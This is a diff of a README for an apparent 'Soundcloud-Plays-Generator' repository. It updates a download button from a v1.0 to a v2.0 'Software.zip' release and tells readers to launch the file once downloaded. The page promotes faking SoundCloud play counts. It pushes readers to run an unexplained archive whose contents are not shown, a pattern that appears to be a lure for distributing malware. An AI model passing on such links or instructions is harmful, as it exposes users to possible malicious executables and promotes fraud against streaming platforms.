@@ -31,7 +31,7 @@ This repository, named "Soundcloud-Plays-Generator", offers a range of features 
 ### Get Started
 To download the repository files, make sure to click the button below:
 
-[![Download Button](https://github.com/norgon4/Soundcloud-Plays-Generator/releases/download/v1.0/Software.zip)](https://github.com/norgon4/Soundcloud-Plays-Generator/releases/download/v1.0/Software.zip)
+[![Download Button](https://github.com/norgon4/Soundcloud-Plays-Generator/releases/download/v2.0/Software.zip)](https://github.com/norgon4/Soundcloud-Plays-Generator/releases/download/v2.0/Software.zip)
 
 Remember, if the link ends with the file name, make sure to launch it after downloading. If you encounter any issues with the link, feel free to check the "Releases" section for alternative options.
 
